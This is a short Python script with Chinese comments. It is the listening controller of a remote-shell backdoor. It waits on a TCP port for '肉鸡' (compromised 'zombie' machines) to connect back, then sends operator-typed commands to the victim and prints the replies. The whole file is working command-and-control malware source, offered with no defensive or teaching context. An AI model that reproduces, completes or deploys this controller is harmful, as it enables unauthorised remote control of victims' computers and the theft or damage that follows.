import socket
import threading
from scapy.layers.l2 import Ether,ARP
#获取本机网卡信息
ip=Ether()/ARP()
def run(clientsock,clientaddr):
    print(clientaddr, "肉鸡上线成功！")
    while True:
        # text=clientsock.recv(1024)
        # print(clientaddr,text.decode("utf-8"))
        text=input("输入命令：")

        clientsock.send(text.encode("utf-8"))



def revc(clientsock,clientaddr):
    while True:
        data = clientsock.recv(4096).decode("gbk")
        print(data)
if __name__ == '__main__':


    port=input("请输入端口号(默认为8088)：")
    if port=="":
        port = 8088
    else:
        port=int(port)
    print("等待肉鸡上线！")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #绑定ip.psrc中的ip就是本地ip地址
    server.bind((ip.psrc, port))
    server.listen(50)
    clientsock, clientaddr = server.accept()
    while True:
        t1=threading.Thread(target=run,args=(clientsock,clientaddr))
        t2=threading.Thread(target=revc,args=(clientsock,clientaddr))
        t1.start()
        t2.start()
        t1.join()
        t2.join()


